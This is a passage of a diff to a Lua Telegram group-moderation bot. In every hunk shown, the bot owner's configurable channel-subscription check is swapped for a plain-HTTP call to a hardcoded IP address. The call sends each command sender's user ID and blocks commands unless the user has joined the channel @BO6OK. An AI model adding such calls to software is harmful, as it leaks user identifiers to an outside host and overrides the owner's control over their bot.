-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_) then
@@ -7733,14 +7491,11 @@ local text =
 send(msg.chat_id_, msg.id_,text)     
 end
 if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_,msg.id_," ❃∫ عذرآ تم قفل التثبيت")  
@@ -7760,14 +7515,11 @@ end
 end,nil) 
 end
 if text == 'الغاء التثبيت' and Mod(msg) then  
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_,msg.id_," ❃∫ عذرآ تم قفل الثبيت")  
@@ -7787,14 +7539,11 @@ end
 end,nil)
 end
 if text == 'الغاء تثبيت الكل' and Mod(msg) then  
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_,msg.id_," ❃∫ عذرآ تم قفل الثبيت")  
@@ -7826,14 +7575,11 @@ send(msg.chat_id_, msg.id_,' ❃∫ تم وضع زمن التكرار ('..Num..'
 end
 if text == "ضع رابط" or text == 'وضع رابط' then
 if msg.reply_to_message_id_ == 0  and Mod(msg) then  
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 send(msg.chat_id_,msg.id_," ❃∫ حسنآ ارسل اليه الرابط الان")
 database:setex(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
@@ -7902,14 +7648,11 @@ end
 end
 if text == 'مسح الرابط' or text == 'حذف الرابط' then
 if Mod(msg) then     
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 send(msg.chat_id_,msg.id_," ❃∫ تم مسح الرابط")           
 database:del(bot_id.."Private:Group:Link"..msg.chat_id_) 
@@ -7923,14 +7666,11 @@ return false
 end
 if text == "حذف الصوره" or text == "مسح الصوره" then 
 if Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_) 
 send(msg.chat_id_, msg.id_,' ❃∫ تم ازالة صورة الكروب') 
@@ -7964,28 +7704,22 @@ send(msg.chat_id_, msg.id_,'['..GetWelcome..']')
 return false  
 end
 if text == 'تفعيل الترحيب' and Mod(msg) then  
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:set(bot_id..'Chek:Welcome'..msg.chat_id_,true) 
 send(msg.chat_id_, msg.id_,' ❃∫ تم تفعيل ترحيب الكروب') 
 return false  
 end
 if text == 'تعطيل الترحيب' and Mod(msg) then  
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:del(bot_id..'Chek:Welcome'..msg.chat_id_) 
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل ترحيب الكروب') 
@@ -8153,14 +7887,11 @@ return false
 end
 -----------------
 if text == 'تعين الايدي' and Manager(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:setex(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
 local Text= [[
@@ -8181,14 +7912,11 @@ return false
 end 
 if text == 'حذف الايدي' or text == 'مسح الايدي' then
 if Manager(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:del(bot_id.."KLISH:ID"..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ❃∫ تم ازالة كليشة الايدي')
@@ -8209,14 +7937,11 @@ send(msg.chat_id_, msg.id_,' ❃∫ تم تعين الايدي')
 end
 
 if text == 'طرد البوتات' and Mod(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 tdcli_function ({ ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
 local admins = tah.members_  
@@ -8241,14 +7966,11 @@ end,nil)
 end   
 end
 if text == ("كشف البوتات") and Mod(msg) then  
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
 local admins = result.members_  
@@ -8293,14 +8015,11 @@ end
 
 if text == 'ضع قوانين' or text == 'وضع قوانين' then 
 if Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:setex(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_,msg.id_," ❃∫ ارسل لي القوانين الان")  
@@ -8373,14 +8092,11 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text and text:match("^اضف صلاحيه (.*)$") and Mod(msg) then 
 ComdNew = text:match("^اضف صلاحيه (.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
 database:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
@@ -8389,14 +8105,11 @@ send(msg.chat_id_, msg.id_, " ❃∫ ارسل نوع الرتبه \n ❃∫ {ع�
 end
 if text and text:match("^مسح صلاحيه (.*)$") and Mod(msg) then 
 ComdNew = text:match("^مسح صلاحيه (.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
 send(msg.chat_id_, msg.id_, "* ❃∫ تم مسح الصلاحيه *\n") 
@@ -8435,14 +8148,11 @@ end
 end
 if text and text:match('رفع (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
 local RTPA = text:match('رفع (.*)')
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
 function by_reply(extra, result, success)   
@@ -8470,14 +8180,11 @@ end
 end
 if text and text:match('تنزيل (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
 local RTPA = text:match('تنزيل (.*)')
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
 function by_reply(extra, result, success)   
@@ -8505,14 +8212,11 @@ end
 end
 if text and text:match('^رفع (.*) @(.*)') and Mod(msg) then 
 local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
 function py_username(extra, result, success)   
@@ -8543,14 +8247,11 @@ end
 end
 if text and text:match('^تنزيل (.*) @(.*)') and Mod(msg) then 
 local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
 function py_username(extra, result, success)   
@@ -8584,14 +8285,11 @@ send(msg.chat_id_, msg.id_,' ❃∫ تم مسح رسائلك'  )
 database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
 end
 if text == "رسايلي" or text == "رسائلي" or text == "msg" then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 send(msg.chat_id_, msg.id_,' ❃∫ عدد رسائلك » { '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
 end 
@@ -8632,14 +8330,11 @@ end
 send(msg.chat_id_, msg.id_,Text) 
 end
 if text == 'تفعيل البوت الخدمي' and DevBOYKAW(msg) then  
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Free:Bots') then
 database:del(bot_id..'Free:Bots') 
@@ -8650,14 +8345,11 @@ end
 send(msg.chat_id_, msg.id_,Text) 
 end
 if text == 'تعطيل البوت الخدمي' and DevBOYKAW(msg) then  
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if not database:get(bot_id..'Free:Bots') then
 database:set(bot_id..'Free:Bots',true) 
@@ -8670,14 +8362,11 @@ end
 if text and text:match('^تنظيف (%d+)$') and Manager(msg) then
 if not database:get(bot_id..'VVVZVV:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
 local num = tonumber(text:match('^تنظيف (%d+)$')) 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if num > 1000 then 
 send(msg.chat_id_, msg.id_,'❃∫تستطيع التنظيف 1000 رساله كحد اقصى') 
@@ -8715,14 +8404,11 @@ send(msg.chat_id_, msg.id_,'❃∫ تم تنظيف جميع الرسائل ال�
 end
 if text == "تغير اسم البوت" or text == "تغيير اسم البوت" then 
 if DevBOYKAW(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
 send(msg.chat_id_, msg.id_," ❃∫ ارسل لي الاسم الان ")  
@@ -8748,14 +8434,11 @@ if database:get(bot_id..'Bc:Bots') and not DevBOYKAW(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ الاذاعه معطله من قبل المطور الاساسي')
 return false
 end
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ❃∫ ارسل الان اذاعتك \n ❃∫ للخروج ارسل الغاء") 
@@ -8766,14 +8449,11 @@ if database:get(bot_id..'Bc:Bots') and not DevBOYKAW(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ الاذاعه معطله من قبل المطور الاساسي')
 return false
 end
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ❃∫ ارسل الان اذاعتك \n ❃∫ للخروج ارسل الغاء ") 
@@ -8784,14 +8464,11 @@ if database:get(bot_id..'Bc:Bots') and not DevBOYKAW(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ الاذاعه معطله من قبل المطور الاساسي')
 return false
 end
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ❃∫ ارسل لي التوجيه الان") 
@@ -8802,14 +8479,11 @@ if database:get(bot_id..'Bc:Bots') and not DevBOYKAW(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫  الاذاعه معطله من قبل المطور الاساسي')
 return false
 end
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ❃∫ ارسل لي التوجيه الان") 
@@ -8817,14 +8491,11 @@ return false
 end 
 if text and text:match('^ضع اسم (.*)') and Manager(msg) or text and text:match('^وضع اسم (.*)') and Manager(msg) then 
 local Name = text:match('^ضع اسم (.*)') or text and text:match('^وضع اسم (.*)') 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
